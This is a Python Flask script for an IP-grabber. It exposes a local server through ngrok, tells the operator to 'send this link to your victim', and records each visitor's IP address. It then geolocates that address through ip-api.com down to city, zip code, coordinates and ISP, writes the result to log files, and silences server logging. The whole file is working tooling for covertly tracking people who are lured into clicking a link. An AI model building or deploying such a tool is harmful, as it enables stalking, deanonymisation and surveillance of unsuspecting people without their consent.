import os, requests, json, logging, datetime

from flask import Flask, request, render_template, jsonify
from style.colors import style

from datetime import datetime

from pyngrok import ngrok



def ngrokServer():
    ngrok_url = ngrok.connect(80, 'http')
    print(style.GREEN('[+]')  + style.RESET(f' Send this link to your victim: {ngrok_url} '))

def logFile():
    logFile.datetime_ = datetime.now().strftime("%Y-%m-%d--%H-%M")
    logFile.log_file = f'Logs/scan - {logFile.datetime_}.txt'

def flaskServer(redirect):
        app = Flask(__name__)

        log = logging.getLogger('werkzeug')
        log.disabled = True
        app.logger.disabled = True

        temp_ip_address_ = []
        uniqe_ips = []


        @app.route('/')
        def index():
            return render_template('main.html', value = redirect)

        @app.route('/', methods=['POST'])
        def get_ip():
            data = request.get_json()
            ip_ = data['ip']

            if ip_ not in uniqe_ips:
                uniqe_ips.append(ip_)
                req = requests.get(f'http://ip-api.com/json/{ip_}')
                resp = json.loads(req.text)

                country     = resp['country'].title()
                countryCode = resp['countryCode'].title()
                region      = resp['region'].title()
                regionName  = resp['regionName'].title()
                city        = resp['city'].title()
                zipCode     = str(resp['zip'])
                latitude    = str(resp['lat'])
                longitude   = str(resp['lon'])
                timezone    = resp['timezone']
                isp         = resp['isp']
                org         = resp['org']
                AS          = resp['as']

                logFile()
                with open(logFile.log_file, 'w') as f:
                    print(str(style.GREEN('\n[+]') + style.RESET(f' New IP found: {ip_}')))
                    f.write(str(f' New IP found: {ip_}\n \n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Country: {country}')))
                    f.write(str(f' Country: {country}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Country Code: {countryCode}')))
                    f.write(str(f' Country Code: {countryCode}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Region Code: {region}')))
                    f.write(str(f' Region Code: {region}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Region Name: {regionName}')))
                    f.write(str(f' Region Name: {regionName}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' City: {city}')))
                    f.write(str(f' City: {city}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Zip Code: {zipCode}')))
                    f.write(str(f' Zip Code: {zipCode}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Latitude: {latitude}')))
                    f.write(str(f' Latitude: {latitude}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Longitude: {longitude}')))
                    f.write(str(f' Longitude: {longitude}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' Timezone: {timezone}')))
                    f.write((str(f' Timezone: {timezone}\n')))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' ISP: {isp}')))
                    f.write(str(f' ISP: {isp}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' ORG: {org}')))
                    f.write(str(f' ORG: {org}\n'))

                    print(str(style.YELLOW(' [-]') + style.RESET(f' AS: {AS}')))
                    f.write(str(f' AS: {AS}\n'))

            else:
                print(style.GREEN('[+]') + style.RESET(f' {ip_} connected again'))
            return jsonify(status="success", data=data)

        app.run(port = 80)
        ngrok.kill()
